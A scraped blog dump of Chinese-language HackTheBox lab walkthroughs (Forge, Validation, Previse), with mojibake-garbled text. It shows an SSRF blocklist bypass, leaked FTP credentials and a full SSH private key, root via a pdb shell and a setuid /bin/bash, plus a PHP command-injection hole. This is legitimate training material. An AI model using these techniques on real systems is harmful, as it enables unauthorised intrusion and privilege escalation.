echo 10.10.11.111 admin.forge.htb &gt;&gt; /etc/hosts è®¿é—®åæç¤ºåªå…è®¸æœ¬åœ°ä¸»æœºï¼Œå¾—æƒ³åŠæ³•ç»•è¿‡ä¸€ä¸‹ æ¼æ´åˆ©ç”¨æ•´ç†ä¸€ä¸‹ç›®å‰çš„ä¿¡æ¯ forge.htbä¸ºä¸€ä¸ªä¸Šä¼ ç‚¹ admin.forge.htbåªå…è®¸æœ¬åœ°è®¿é—® å’±ä»¬å’±ä»¬æŠ“ä¸€ä¸‹ä¸Šä¼ ç‚¹çš„åŒ…çœ‹çœ‹å†…å®¹ çœ‹åˆ°åé¢æ‰å‘ç°è¿™ä¸ªé¡µé¢è¿˜æœ‰ä¸€ä¸ªUpload from urlçš„åŠŸèƒ½ï¼Œç–å¿½äº†ã€‚ æŠ“ä¸ªåŒ…çœ‹çœ‹ è¿™è¾¹éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿ä»¥åï¼Œæ˜¾ç¤ºæ”¯æŒhttpå’Œhttpsåè®®ï¼Œå†ç»“åˆæˆ‘ä»¬ä¹‹å‰çš„admin.forge.htbæ¥çœ‹ï¼Œè¿™ä¸å°±æ˜¯ä¸€ä¸ªå¦¥å¦¥çš„SSRFï¼Ÿ è¿™æ ·åˆ©ç”¨åï¼Œæ˜¾ç¤ºè¯¥URLè¢«åˆ—å…¥äº†é»‘åå•ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡ä¸€ä¸‹ å°è¯•æ€§ä½¿ç”¨å¤§å°å†™ç»•è¿‡æ–¹å¼è½»è½»æ¾æ¾ç»•è¿‡ï¼Œè¿”å›äº†ä¸€ä¸ªURLï¼Œæ‰“å¼€çœ‹çœ‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://forge.htb/uploads/2Y6eGsD37WCBc1m3pSJO &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Admin Portal&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt; &lt;header&gt; &lt;nav&gt; &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt; &lt;/nav&gt; &lt;/header&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;center&gt;&lt;h1&gt;Welcome Admins!&lt;/h1&gt;&lt;/center&gt; &lt;/body&gt; &lt;/html&gt; æˆåŠŸè¯»å–åˆ°å†…å®¹ï¼Œç»™äº†ä¸€ä¸ª/announcementsç›®å½• è®©æˆ‘ä»¬æ‹¿å»å†å»è¯»å–ä¸€ä¸‹ï¼Œè¿”å›äº†åŸŸåï¼Œæ¥ç€è®¿é—® http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://forge.htb/uploads/CnrWy5jKhQ1mykfx1ONY &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Announcements&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/main.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/css/announcements.css&quot;&gt; &lt;header&gt; &lt;nav&gt; &lt;h1 class=&quot;&quot;&gt;&lt;a href=&quot;/&quot;&gt;Portal home&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right margin-right&quot;&gt;&lt;a href=&quot;/announcements&quot;&gt;Announcements&lt;/a&gt;&lt;/h1&gt; &lt;h1 class=&quot;align-right&quot;&gt;&lt;a href=&quot;/upload&quot;&gt;Upload image&lt;/a&gt;&lt;/h1&gt; &lt;/nav&gt; &lt;/header&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;ul&gt; &lt;li&gt;An internal ftp server has been setup with credentials as user:heightofsecurity123!&lt;/li&gt; &lt;li&gt;The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.&lt;/li&gt; &lt;li&gt;The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt; &lt;/html&gt; æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªFTPè´¦å·å¯†ç  username = user password = heightofsecurity123! è¿™è¾¹æç¤ºftpä¸èƒ½è¢«å¤–éƒ¨ç™»å½•ï¼Œä½†uploadæ¥å£å¯ä»¥ä½¿ç”¨?u=å‚æ•°æŒ‡å®šftp url url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&amp;remote=1 ç»§ç»­è°ƒç”¨ http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz ç»§ç»­è®¿é—®ï¼Œè¿™ä¸ªæ­¥éª¤é‡å¤æ€§å¥½é«˜å•Š â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://forge.htb/uploads/BRrgg0w44uZvHW3WEnWz 1 âš™ drwxr-xr-x 3 1000 1000 4096 Aug 04 19:23 snap -rw-r----- 1 0 1000 33 Sep 24 18:02 user.txt è¿™æ ·è·å–å¥½éº»çƒ¦ï¼Œåˆä¸æƒ³ï¼ˆhuiï¼‰å†™è„šæœ¬ï¼Œè¯•è¯•çœ‹æœ‰æ²¡æœ‰ç§é’¥å§ url=http://Admin.Forge.htb/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&amp;remote=1 http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://forge.htb/uploads/cBNUTYA6eT50o5vEjpY1 -----BEGIN OPENSSH PRIVATE KEY----- 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 shlLupso7WoS0AAAAKdXNlckBmb3JnZQE= -----END OPENSSH PRIVATE KEY----- æˆåŠŸæ‹¿åˆ°ç§é’¥ï¼Œä¿å­˜åˆ°æœ¬åœ°åä½¿ç”¨ç§é’¥è¿›è¡Œç™»å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# chmod 600 id_rsa 1 âš™ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh user@10.10.11.111 -i id_rsa 1 âš™ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 27 Sep 2021 03:26:19 AM UTC System load: 0.0 Processes: 220 Usage of /: 45.0% of 6.82GB Users logged in: 0 Memory usage: 30% IPv4 address for eth0: 10.10.11.111 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Sep 26 21:31:23 2021 from 10.10.14.120 -bash-5.0$ whoami&amp;&amp;id user uid=1000(user) gid=1000(user) groups=1000(user) ç™»å…¥æˆåŠŸ -bash-5.0$ ls snap user.txt -bash-5.0$ cat user.txt 7e72b4a44d946d578baa60ad23b0482f æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹sudo -l -bash-5.0$ sudo -l Matching Defaults entries for user on forge: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user may run the following commands on forge: (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py è¿™é‡Œçš„æ„æ€æ˜¯/usr/bin/python3å¯ä»¥ä½¿ç”¨rootæƒé™æ‰§è¡Œ/opt/remote-manage.pyè„šæœ¬ å’±ä»¬å»çœ‹ä¸€ä¸‹è¿™ä¸ªè„šæœ¬ -bash-5.0$ cat /opt/remote-manage.py #!/usr/bin/env python3 import socket import random import subprocess import pdb port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((&#39;127.0.0.1&#39;, port)) sock.listen(1) print(f&#39;Listening on localhost:{port}&#39;) (clientsock, addr) = sock.accept() clientsock.send(b&#39;Enter the secret passsword: &#39;) if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;: clientsock.send(b&#39;Wrong password!\\n&#39;) else: clientsock.send(b&#39;Welcome admin!\\n&#39;) while True: clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;) clientsock.send(b&#39;[1] View processes\\n&#39;) clientsock.send(b&#39;[2] View free memory\\n&#39;) clientsock.send(b&#39;[3] View listening sockets\\n&#39;) clientsock.send(b&#39;[4] Quit\\n&#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(&#39;df&#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode()) elif option == 4: clientsock.send(b&#39;Bye\\n&#39;) break except Exception as e: print(e) pdb.post_mortem(e.__traceback__) finally: quit() è¿™ä¸ªè„šæœ¬çš„æ„æ€æ˜¯è¿è¡Œè„šæœ¬åä¼šå¼€å¯ä¸€ä¸ªç«¯å£ï¼Œè¿æ¥ç€ä¸€ä¸ªç«¯å£è¾“å…¥é€‰é¡¹ï¼Œå¼‚å¸¸çŠ¶æ€æ—¶ä¼šè¿›å…¥pdbï¼Œä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„pythonä»£ç  é‚£ä¹ˆåŸç†æœ‰äº†ï¼Œè¯´å¹²å°±å¹² é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰“å¼€ä¸¤ä¸ªçª—å£ï¼Œä¸€ä¸ªç”¨äºæ‰§è¡Œè„šæœ¬ï¼Œä¸€ä¸ªç”¨äºè¿æ¥ç«¯å£ Server-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:34260 Client-bash-5.0$ nc localhost 34260 Enter the secret passsword: secretadminpassword Welcome admin! What do you wanna do: [1] View processes [2] View free memory [3] View listening sockets [4] Quit &#39; å¯†ç åœ¨è„šæœ¬ä¸­ï¼Œç™»å½•åè¾“å…¥ä¸€ä¸ªé¡¿å·å³å¯æŠ¥é”™ ææƒåæ“ä½œ-bash-5.0$ sudo /usr/bin/python3 /opt/remote-manage.py Listening on localhost:34260 invalid literal for int() with base 10: b&quot;&#39;&quot; &gt; /opt/remote-manage.py(27)&lt;module&gt;() -&gt; option = int(clientsock.recv(1024).strip()) (Pdb) import os (Pdb) os.system(&quot;ls /root&quot;) clean-uploads.sh root.txt snap 0 (Pdb) os.system(&quot;chmod +s /bin/bash&quot;) 0 (Pdb) exit() -bash-5.0$ ls -la /bin/bash -rwsr-sr-x 1 root root 1183448 Jun 18 2020 /bin/bash -bash-5.0$ /bin/bash -p bash-5.0# whomai&amp;&amp;id bash: whomai: command not found bash-5.0# whoami&amp;&amp;id root uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),1000(user) bash-5.0# cd /root bash-5.0# ls clean-uploads.sh root.txt snap bash-5.0# cat root.txt 67a501971344b12bade28d6a75e98cbd æŠ¥é”™åï¼Œä½¿ç”¨pythonå¯¼å…¥os.systemæ¨¡å—ï¼Œç„¶åå³å¯æ‰§è¡Œsystemæƒé™ æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Validation - Hackthebox","slug":"Hackthebox - Validation","date":"2021-09-27T11:38:36.000Z","updated":"2023-05-20T03:27:20.000Z","comments":true,"path":"2021/09/27/Hackthebox - Validation/","link":"","permalink":"http://www.lucifiel.com/2021/09/27/Hackthebox%20-%20Validation/","excerpt":"","text":"Hackthebox - Validationé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†é¦–å…ˆä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -sS -A -sC -sV 10.10.11.116 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 04:02 EDT Nmap scan report for 10.10.11.116 Host is up (0.35s latency). Not shown: 992 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8). 5000/tcp filtered upnp 5001/tcp filtered commplex-link 5002/tcp filtered rfe 5003/tcp filtered filemaker 5004/tcp filtered avt-profile-1 8080/tcp open http nginx |_http-title: 502 Bad Gateway No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=9/23%OT=22%CT=1%CU=39467%PV=Y%DS=2%DC=T%G=Y%TM=614C34A OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2= OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 364.74 ms 10.10.14.1 2 364.80 ms 10.10.11.116 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.02 seconds","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Previse - Hackthebox","slug":"Hackthebox - Previse","date":"2021-08-09T11:38:36.000Z","updated":"2023-05-20T02:48:10.000Z","comments":true,"path":"2021/08/09/Hackthebox - Previse/","link":"","permalink":"http://www.lucifiel.com/2021/08/09/Hackthebox%20-%20Previse/","excerpt":"","text":"Hackthebox - Previseé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†ä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.11.104 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-08 22:27 CST Nmap scan report for 10.10.11.104 Host is up (0.25s latency). Not shown: 65461 closed ports, 72 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=8/8%OT=22%CT=1%CU=38368%PV=Y%DS=2%DC=T%G=Y%TM=610FF0E8 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS( OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11 OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN( OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 554/tcp) HOP RTT ADDRESS 1 249.39 ms 10.10.14.1 2 249.51 ms 10.10.11.104 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1810.62 seconds å’±ä»¬è¿›80ç«¯å£çœ‹ä¸€ä¸‹HTTPæœåŠ¡çš„å†…å®¹ è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ç®¡ç†æœåŠ¡å™¨ï¼Œæˆ‘æµ‹è¯•äº†ä¸€ä¸‹ç®€å•çš„å¼±å£ä»¤æ— æœï¼Œå’±ä»¬å…ˆfuzzä¸€ä¸‹å§ â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 100 -e php,html,txt -mc 200,302,301 -u http://10.10.11.104/FUZZ /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.104/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt :: Extensions : php html txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,302,301 ________________________________________________ login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] index.php [Status: 302, Size: 2801, Words: 737, Lines: 72] index.html [Status: 200, Size: 663, Words: 24, Lines: 23] download.php [Status: 302, Size: 0, Words: 1, Lines: 1] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] footer.php [Status: 200, Size: 217, Words: 10, Lines: 6] header.php [Status: 200, Size: 980, Words: 183, Lines: 21] favicon.ico [Status: 200, Size: 15406, Words: 15, Lines: 10] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] . [Status: 302, Size: 2801, Words: 737, Lines: 72] status.php [Status: 302, Size: 2968, Words: 749, Lines: 75] nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32] index.html [Status: 200, Size: 663, Words: 24, Lines: 23] index.php [Status: 302, Size: 2801, Words: 737, Lines: 72] accounts.php [Status: 302, Size: 3994, Words: 1096, Lines: 94] files.php [Status: 302, Size: 4914, Words: 1531, Lines: 113] login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] files.php [Status: 302, Size: 4914, Words: 1531, Lines: 113] :: Progress: [148168/148168] :: Job [1/1] :: 391 req/sec :: Duration: [0:06:55] :: Errors: 4 :: ç›´æ¥è®¿é—®äº†éƒ¨åˆ†é¡µé¢ï¼Œéƒ½ä¼šè·³è½¬åˆ°index.phpé¡µé¢ï¼Œä½¿ç”¨curlè®¿é—®è¯•è¯• curl http://10.10.11.104/files.php &lt;td&gt;&lt;a href=&#39;download.php?file=32&#39;&gt;&lt;button class=&quot;uk-button uk-button-text&quot;&gt;siteBackup.zip&lt;/button&gt;&lt;/a&gt;&lt;/td&gt; è¿™æ ·çœ‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€äº›ç‰¹æ®Šçš„æŠ€å·§æ¥è®¿é—®éƒ¨åˆ†é¡µé¢ è®¿é—® /accounts.php ä¼šè·³è½¬åˆ° /index.php ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨burpæŠ“åŒ… æŠ“åŒ…åç‚¹å‡» Do interrcept &gt; Response to this request æ¥è¿›è¡Œæ›´æ”¹çŠ¶æ€ç  å°†æ¡†é€‰èµ·æ¥çš„éƒ¨åˆ†ä¿®æ”¹ä¸º HTTP/1.1 200 ç„¶åæ”¾åŒ… æˆåŠŸè¿›å…¥æ·»åŠ æ–°ç”¨æˆ·çš„é¡µé¢ æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ· åˆ›å»ºå¥½ä»¥åï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ° index.php é¡µé¢ï¼Œç„¶åå»ç™»å½• ç™»å…¥ååœ¨ FILES é¡µé¢ä¸‹æœ‰ä¸€ä¸ªä¸Šä¼ ç‚¹å’Œä¸€ä¸ªæ–‡ä»¶ SITEBACKUP.ZIP ï¼Œå…ˆä¸‹è½½ä¸‹æ¥çœ‹çœ‹ ### config.php &lt;?php function connectDB(){ $host = &#39;localhost&#39;; $user = &#39;root&#39;; $passwd = &#39;mySQL_p@ssw0rd!:)&#39;; $db = &#39;previse&#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?&gt; å¾—åˆ°äº†mysqlçš„è´¦å·å¯†ç  ### logs.php &lt;?php session_start(); if (!isset($_SESSION[&#39;user&#39;])) { header(&#39;Location: login.php&#39;); exit; } ?&gt; &lt;?php if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) { header(&#39;Location: login.php&#39;); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(&quot;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&quot;); echo $output; $filepath = &quot;/var/www/out.log&quot;; $filename = &quot;out.log&quot;; if(file_exists($filepath)) { header(&#39;Content-Description: File Transfer&#39;); header(&#39;Content-Type: application/octet-stream&#39;); header(&#39;Content-Disposition: attachment; filename=&quot;&#39;.basename($filepath).&#39;&quot;&#39;); header(&#39;Expires: 0&#39;); header(&#39;Cache-Control: must-revalidate&#39;); header(&#39;Pragma: public&#39;); header(&#39;Content-Length: &#39; . filesize($filepath)); ob_clean(); // Discard data in the output buffer flush(); // Flush system headers readfile($filepath); die(); } else { http_response_code(404); die(); } ?&gt; ä»ä¸Šè¿°ä»£ç å®¡è®¡å‘ç°ï¼Œè¿™å°é¶æœºçš„ç¨‹åºä½¿ç”¨äº†pythonè¿›è¡Œç¼–å†™ï¼Œè€Œä¸æ˜¯PHPï¼Œä»ä»£ç 